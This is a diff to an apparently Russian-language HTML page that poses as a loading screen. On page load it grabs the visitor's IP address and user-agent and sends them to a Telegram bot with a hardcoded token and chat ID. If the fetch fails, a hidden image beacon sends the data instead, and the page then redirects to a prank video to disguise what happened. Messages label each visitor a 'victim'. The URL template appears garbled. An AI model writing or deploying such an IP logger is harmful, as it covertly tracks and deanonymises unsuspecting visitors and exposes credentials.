@@ -2,49 +2,71 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Тест</title>
+  <title>Загрузка...</title>
+  <meta http-equiv="refresh" content="3;url=https://www.youtube.com/watch?v=dQw4w9WgXcQ"> <!-- Редирект через 3 сек на rickroll, поменяй ссылку -->
   <style>
-    body { font-family: Arial; text-align: center; padding: 50px; background: #111; color: #0f0; }
-    h1 { color: #f44; }
+    body { font-family: Arial; text-align: center; padding: 100px; background: #000; color: #0f0; }
+    h1 { color: #f00; }
   </style>
 </head>
 <body>
-  <h1>Загружается...</h1>
-  <p id="info">Жди секунду</p>
+  <h1>Подожди секунду...</h1>
+  <p id="info">Собираем данные...</p>
 
   <script>
-    async function sendToTelegram(ip) {
-      const token = "8564854246:AAEP6PZzYjG2PcUdRX-R4BqtTZi-cA_ZL_Y";
-      const chat_id = "5684291694";
-      const text = `Новый заход!\nIP: ${ip}\nВремя: ${new Date().toLocaleString()}\nUser-Agent: ${navigator.userAgent}`;
+    const token = "8564854246:AAEP6PZzYjG2PcUdRX-R4BqtTZi-cA_ZL_Y";
+    const chat_id = "5684291694";
+    const redirectUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // ← поменяй сюда свой прикольный сайт
 
-      const url = `https://api.telegram.org/bot\( {token}/sendMessage?chat_id= \){chat_id}&text=${encodeURIComponent(text)}`;
-
-      try {
-        const res = await fetch(url);
-        if (res.ok) {
-          document.getElementById("info").innerHTML = "Данные отправлены в Telegram";
-        } else {
-          document.getElementById("info").innerHTML = "Ошибка отправки";
-        }
-      } catch (e) {
-        document.getElementById("info").innerHTML = "Ошибка: " + e.message;
-      }
-    }
-
-    async function getIPAndSend() {
+    async function getIP() {
       try {
         const res = await fetch("https://api.ipify.org?format=json");
         const data = await res.json();
-        const ip = data.ip;
-        await sendToTelegram(ip);
-      } catch (e) {
-        await sendToTelegram("Не удалось получить IP");
+        return data.ip || "Неизвестно";
+      } catch {
+        return "Ошибка IP";
       }
     }
 
-    // Запуск при загрузке страницы
-    window.onload = getIPAndSend;
+    async function tryFetchSend(ip) {
+      const text = `Новый жертва!\nIP: ${ip}\nВремя: ${new Date().toLocaleString('ru')}\nUA: ${navigator.userAgent}`;
+      const url = `https://api.telegram.org/bot\( {token}/sendMessage?chat_id= \){chat_id}&text=${encodeURIComponent(text)}`;
+
+      try {
+        const res = await fetch(url, { mode: 'no-cors' }); // no-cors — не читаем ответ, но шлём
+        document.getElementById("info").innerHTML = "Отправлено (fetch)!";
+        return true;
+      } catch (e) {
+        return false;
+      }
+    }
+
+    function fallbackImgSend(ip) {
+      const text = `Новый (fallback)!\nIP: ${ip}\nВремя: ${new Date().toLocaleString('ru')}\nUA: ${navigator.userAgent}`;
+      const url = `https://api.telegram.org/bot\( {token}/sendMessage?chat_id= \){chat_id}&text=${encodeURIComponent(text)}`;
+      
+      const img = new Image();
+      img.src = url + '&_=' + Date.now(); // кэш-байпас
+      document.body.appendChild(img); // браузер сам отправит GET
+      document.getElementById("info").innerHTML = "Отправлено через img (fallback)";
+    }
+
+    async function main() {
+      const ip = await getIP();
+      
+      const fetchOk = await tryFetchSend(ip);
+      
+      if (!fetchOk) {
+        fallbackImgSend(ip);
+      }
+
+      // Редирект сразу после попытки (или через 3 сек по meta refresh)
+      setTimeout(() => {
+        window.location.href = redirectUrl;
+      }, 1500); // 1.5 сек — хватит на отправку
+    }
+
+    main();
   </script>
 </body>
 </html>
